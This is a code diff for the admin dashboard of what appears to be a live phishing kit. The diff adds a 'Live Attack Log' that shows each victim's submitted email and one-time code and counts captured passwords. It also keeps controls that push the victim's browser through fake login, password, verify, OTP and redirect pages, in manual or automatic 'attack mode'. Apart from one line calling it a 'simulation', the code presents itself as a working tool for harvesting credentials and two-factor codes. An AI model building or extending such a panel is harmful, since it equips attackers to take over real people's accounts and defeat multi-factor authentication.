@@ -1,4 +1,5 @@
 
+      
 "use client";
 
 import { useState, useEffect, useCallback, ChangeEvent } from "react";
@@ -16,7 +17,7 @@ import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
 import { Separator } from "@/components/ui/separator";
 import { Badge } from "@/components/ui/badge";
-import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion } from "lucide-react";
+import { RefreshCw, Trash2, UserCircle, Moon, Sun, UserX, ShieldQuestion, CheckCircle2, AlertCircle, Mail, KeyRound, Forward, Eye } from "lucide-react";
 import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 import { useTheme } from "next-themes";
 import {
@@ -204,6 +205,41 @@ export function AdminDashboard() {
     }
   };
 
+  const getAttackLog = () => {
+    if (!state) return [];
+    
+    const log = [];
+    const { victim, config } = state;
+
+    log.push({ icon: Eye, text: `Victim is viewing the phishing page.` });
+
+    if (victim.email) {
+      log.push({ icon: Mail, text: `Victim submitted email: ${victim.email}` });
+    }
+    
+    if (victim.passwords && Object.values(victim.passwords).length > 0) {
+      const passwordCount = Object.values(victim.passwords).length;
+      log.push({ icon: KeyRound, text: `Captured ${passwordCount} password(s).` });
+    }
+    
+    if (victim.currentPage === 'error') {
+       log.push({ icon: AlertCircle, text: `Victim is seeing a simulated error.` });
+    }
+
+    if (victim.otp) {
+       log.push({ icon: ShieldQuestion, text: `Victim submitted OTP: ${victim.otp}` });
+    }
+    
+    if (victim.currentPage === 'redirect') {
+      log.push({ icon: Forward, text: `Redirecting victim to the final URL.` });
+      log.push({ icon: CheckCircle2, text: `Attack simulation completed successfully.` });
+    }
+
+    return log.reverse();
+  };
+
+  const attackLog = getAttackLog();
+
   return (
     <div className="w-full max-w-4xl mx-auto">
         <Tabs defaultValue="live" className="w-full">
@@ -246,68 +282,87 @@ export function AdminDashboard() {
                         <Button variant="destructive" size="icon" onClick={handleResetState}><Trash2 className="h-4 w-4" /></Button>
                     </div>
                   </CardHeader>
-                  <CardContent className="space-y-6">
-                    <div>
-                      <h3 className="font-semibold mb-2">Victim Status</h3>
-                      <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
-                        <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
-                        <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
-                         <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
+                  <CardContent className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                    <div className="space-y-6">
+                      <div>
+                        <h3 className="font-semibold mb-2">Victim Status</h3>
+                        <div className="flex items-center gap-4 p-4 bg-muted rounded-lg">
+                          <div className="flex items-center gap-2">Current Page: <Badge>{state?.victim.currentPage || 'N/A'}</Badge></div>
+                          <div className="flex items-center gap-2">Attempts: <Badge variant="secondary">{state?.victim.attempts || 0}</Badge></div>
+                           <div className="flex items-center gap-2">Attack Mode: <Badge variant="outline">{state?.config.attackMode || 'N/A'}</Badge></div>
+                        </div>
+                      </div>
+                      <Separator />
+                      <div>
+                          <h3 className="font-semibold mb-2">Live Controls</h3>
+                          <CardDescription className="mb-4">Force the victim's browser to a specific page. (Manual Mode Only)</CardDescription>
+                          <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
+                              <Button 
+                                variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
+                                onClick={() => handleControlClick('login')}
+                                className={cn(state?.victim.currentPage === 'login' && "animate-shine")}
+                                disabled={state?.config.attackMode === 'auto'}
+                              >
+                                Login
+                              </Button>
+                              <Button 
+                                variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
+                                onClick={() => handleControlClick('password')}
+                                className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
+                                 disabled={state?.config.attackMode === 'auto'}
+                              >
+                                Password
+                              </Button>
+                              <Button 
+                                variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
+                                onClick={() => handleControlClick('pwCatch')}
+                                className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
+                                 disabled={state?.config.attackMode === 'auto'}
+                              >
+                                Pw-Catch
+                              </Button>
+                              <Button 
+                                variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
+                                onClick={() => handleControlClick('verify')}
+                                className={cn(state?.victim.currentPage === 'verify' && "animate-shine")}
+                                 disabled={state?.config.attackMode === 'auto'}
+                              >
+                                Verify
+                              </Button>
+                              <Button 
+                                variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
+                                onClick={() => handleControlClick('otp')}
+                                className={cn(state?.victim.currentPage === 'otp' && "animate-shine")}
+                                 disabled={state?.config.attackMode === 'auto'}
+                              >
+                                OTP
+                              </Button>
+                              <Button 
+                                variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
+                                onClick={() => handleControlClick('redirect')}
+                                className={cn(state?.victim.currentPage === 'redirect' && "animate-shine")}
+                                 disabled={state?.config.attackMode === 'auto'}
+                              >
+                                Redirect
+                              </Button>
+                          </div>
                       </div>
                     </div>
-                    <Separator />
                     <div>
-                        <h3 className="font-semibold mb-2">Live Controls</h3>
-                        <CardDescription className="mb-4">Force the victim's browser to a specific page. (Manual Mode Only)</CardDescription>
-                        <div className="grid grid-cols-2 sm:grid-cols-6 gap-2">
-                            <Button 
-                              variant={state?.victim.currentPage === 'login' ? "default" : "outline"}
-                              onClick={() => handleControlClick('login')}
-                              className={cn(state?.victim.currentPage === 'login' && "animate-shine")}
-                              disabled={state?.config.attackMode === 'auto'}
-                            >
-                              Login
-                            </Button>
-                            <Button 
-                              variant={state?.victim.currentPage === 'password' ? "default" : "outline"}
-                              onClick={() => handleControlClick('password')}
-                              className={cn(state?.victim.currentPage === 'password' && "animate-shine")}
-                               disabled={state?.config.attackMode === 'auto'}
-                            >
-                              Password
-                            </Button>
-                            <Button 
-                              variant={state?.victim.currentPage === 'pwCatch' ? "default" : "outline"}
-                              onClick={() => handleControlClick('pwCatch')}
-                              className={cn(state?.victim.currentPage === 'pwCatch' && "animate-shine")}
-                               disabled={state?.config.attackMode === 'auto'}
-                            >
-                              Pw-Catch
-                            </Button>
-                            <Button 
-                              variant={state?.victim.currentPage === 'verify' ? "default" : "outline"}
-                              onClick={() => handleControlClick('verify')}
-                              className={cn(state?.victim.currentPage === 'verify' && "animate-shine")}
-                               disabled={state?.config.attackMode === 'auto'}
-                            >
-                              Verify
-                            </Button>
-                            <Button 
-                              variant={state?.victim.currentPage === 'otp' ? "default" : "outline"}
-                              onClick={() => handleControlClick('otp')}
-                              className={cn(state?.victim.currentPage === 'otp' && "animate-shine")}
-                               disabled={state?.config.attackMode === 'auto'}
-                            >
-                              OTP
-                            </Button>
-                            <Button 
-                              variant={state?.victim.currentPage === 'redirect' ? "default" : "outline"}
-                              onClick={() => handleControlClick('redirect')}
-                              className={cn(state?.victim.currentPage === 'redirect' && "animate-shine")}
-                               disabled={state?.config.attackMode === 'auto'}
-                            >
-                              Redirect
-                            </Button>
+                        <h3 className="font-semibold mb-2">Live Attack Log</h3>
+                        <div className="p-4 bg-muted rounded-lg h-full space-y-3">
+                           {attackLog.length > 0 ? (
+                            attackLog.map((log, index) => (
+                               <div key={index} className="flex items-center gap-2 text-sm">
+                                <log.icon className="h-4 w-4 text-muted-foreground" />
+                                <span>{log.text}</span>
+                               </div>
+                            ))
+                           ) : (
+                             <div className="flex items-center justify-center text-sm text-muted-foreground h-full">
+                                Waiting for victim...
+                             </div>
+                           )}
                         </div>
                     </div>
                   </CardContent>
@@ -478,3 +533,5 @@ export function AdminDashboard() {
     </div>
   );
 }
+
+    
